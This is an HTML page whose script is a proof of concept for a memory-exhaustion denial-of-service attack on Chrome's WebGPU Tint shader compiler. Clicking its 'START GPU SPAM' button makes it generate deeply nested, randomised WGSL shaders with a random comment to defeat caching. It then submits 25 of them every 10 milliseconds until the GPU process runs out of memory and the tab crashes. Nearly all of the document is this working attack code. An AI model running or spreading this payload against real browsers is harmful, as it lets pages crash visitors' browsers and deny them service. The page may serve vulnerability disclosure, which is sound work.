<!DOCTYPE html>
<html>
<head>
    <title>WebGPU Tint OOM DoS</title>
    <style>body { font-family: monospace; background: #222; color: #0f0; font-size: 18px; }</style>
</head>
<body>
    <h2>Tint AST Memory Exhaustion PoC (Cache Bypassed)</h2>
    <p>Clicking the button will spam the GPU process with unique payloads. Wait ~30 seconds.</p>
    <button id="crashBtn" style="padding: 20px; font-size: 20px; background: red; color: white; cursor:pointer;">START GPU SPAM</button>
    <div id="status" style="margin-top: 20px;">Waiting...</div>

    <script>
        const statusEl = document.getElementById('status');

        function buildKillerShader() {
            let mathExpr = "(1.0)";
            const ops = ['+', '-', '*', '/'];
            const baseStr = "vec4<f32>(vec2<f32>(1.0, 1.0), vec2<f32>(1.0, 1.0)).x";
            
            // Jitter the depth to fragment the C++ heap and ensure unique trees
            const depth = 160 + Math.floor(Math.random() * 15);
            
            for (let i = 0; i < depth; i++) {
                const op = ops[Math.floor(Math.random() * ops.length)]; 
                mathExpr = `(${mathExpr} ${op} ${baseStr})`;
            }
            
            // The Cache Buster: A random number guarantees Chrome cannot cache the parsing result!
            return `
                // CACHE BUSTER: ${Math.random()}
                @vertex fn vs_main() -> @builtin(position) vec4<f32> {
                    let crazy_var = ${mathExpr};
                    return vec4<f32>(crazy_var, 0.0, 0.0, 1.0);
                }
            `;
        }

        async function triggerCrash() {
            if (!navigator.gpu) {
                statusEl.innerText = "WebGPU is not supported.";
                return;
            }

            const adapter = await navigator.gpu.requestAdapter();
            const device = await adapter.requestDevice();

            let count = 0;
            statusEl.innerText = "Bypassing Shader Cache and spamming Tint Compiler...\nWait for the Aw, Snap!";

            setInterval(() => {
                for (let i = 0; i < 25; i++) {
                    count++;
                    const killerWGSL = buildKillerShader();
                    try {
                        // Because of the cache buster, Chrome MUST parse this every single time
                        device.createShaderModule({ code: killerWGSL });
                    } catch (e) {
                        // Ignore JS-side errors
                    }
                }
                
                if (count % 500 === 0) {
                    statusEl.innerText = `Bypassed Cache & Sent ${count} unique payloads. GPU RAM filling up...`;
                }
            }, 10); 
        }

        document.getElementById('crashBtn').addEventListener('click', triggerCrash);
    </script>
</body>
</html>
